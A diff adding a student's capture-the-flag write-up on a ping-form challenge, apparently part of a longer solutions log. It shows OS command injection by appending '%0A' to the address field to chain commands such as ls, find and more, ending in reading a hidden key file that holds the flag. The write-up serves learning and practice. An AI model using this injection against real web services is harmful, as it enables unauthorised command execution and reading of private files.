@@ -430,7 +430,86 @@ this when used in the proper format makes the flag.
 ### What I learned
  First and foremostm I learned about the John-the-Ripper software which is used to crack passwords from their hash encryptions. It can use a wordlist or specific list of preset passwords and compare them to the hash in order to figure out the real password. That's what we applied here and thus we also learnt how to use it on the cli. I installed it, ran it, found the commands and steps required from the web and also from AI and found the flag. It gave me experience on what to do when required to handle hashes and passwords.
 
-  # 17_AETHERCORP_NETPROBEX
+# AetherCorp NetprobeX
+This challenge required us to uncover a hidden backdoor in the NetProbeX system, a remnant of the former AetherCorp. The task involved analyzing logs and exploiting vulnerabilities to retrieve a passcode. The engineers left subtle hints in the logs, which we had to decipher to progress. Our goal was to find and exploit this backdoor to get the flag.
+
+## My solve
+*Flag:* citadel{bl4ck51t3_4cc3ss_gr4nt3d}
+
+Initially, We were unsure what to do, so we started by testing the input field with the placeholder text provided. so we entered 8.8.8.8 in the textbox, which triggered a ping command. Here is the response we received:
+
+   ```bash
+   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.90 ms
+   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.85 ms
+   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.95 ms
+   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.96 ms
+
+
+   --- 8.8.8.8 ping statistics ---
+   4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+   rtt min/avg/max/mdev = 3.845/3.913/3.961/0.046 ms
+ ```
+
+We tried entering other commands like ls but received an error: ping: ls: No address associated with hostname. This indicated that the system was interpreting our input as part of the ping command and not executing shell commands directly.
+We got to know about using %0A to inject multiple commands. So we tested this by entering 8.8.8.8%0A ls:
+   ```bash
+   Executing: ping -c 4 8.8.8.8%0A ls
+   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.82 ms
+   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=4.00 ms
+   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.97 ms
+   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.97 ms
+   --- 8.8.8.8 ping statistics ---
+   4 packets transmitted, 4 received, 0% packet loss, time 3004ms
+   rtt min/avg/max/mdev = 3.818/3.938/4.000/0.070 ms
+   app.py
+   mission_briefing.txt
+   requirements.txt
+   templates
+   ```
+We tried reading the contents of mission_briefing.txt using more (since cat wasn't working, so we searched on google to find any alternatives of cat):
+   
+   ================= OPERATION: SILENT ECHO =================
+                   CLASSIFICATION: BLACK ICE
+
+   Agent, your objective is to recover the Blacksite Key.
+   Our intel confirms it’s hidden deep within the AetherCorp network.
+   =========================================================
+   
+   The file hinted at a hidden key deep within the network.
+We used the find command to locate directories related to AetherCorp. So we used the file command to search the location of the folder if it exists.:
+   ```bash
+   8.8.8.8%0A find / -name aethercorp
+   ```
+   This returned /var/lib/aethercorp as the only accessible folder with no permission constraints.
+
+Exploring further we listed further and then after some more hit and trials found the archive folder and we found a hidden .secrets directory within /var/lib/aethercorp/archive using:
+
+   ```bash
+   8.8.8.8%0A ls /var/lib/aethercorp/archive -a
+   ```
+   Inside the .secrets directory was a file called blacksite_key.dat.
+
+7. Finally, We viewed the contents of blacksite_key.dat using:
+
+   ```bash
+   8.8.8.8%0A more /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
+   ```
+   This revealed the flag.
+   
+## What I learned
+
+This challenge taught me about:
+
+Command Injection using %0A to chain commands in restricted environments.
+Alternative File Viewing using tools like more or less when cat is unavailable or not allowed.
+Navigating through system directories to uncover hidden files and folders.
+Understanding how to interpret subtle hints left behind in logs.
+
+## References
+Google for command injection techniques and alternative file viewing methods.
+ChatGPT for syntax and command structures.
 
   # 18.FEELS_LIKE_WE_ALWAYS_GO_BACKWARDS
   This challenge was about figuring out answers to 3 consequtive puzzles. However, there was no way one could get the answers out of the provided details. Thus, the only way was to use "Reverse-engineering". We all had to somehow find access to the program's source code, find clues and figure out answers from the code itself.
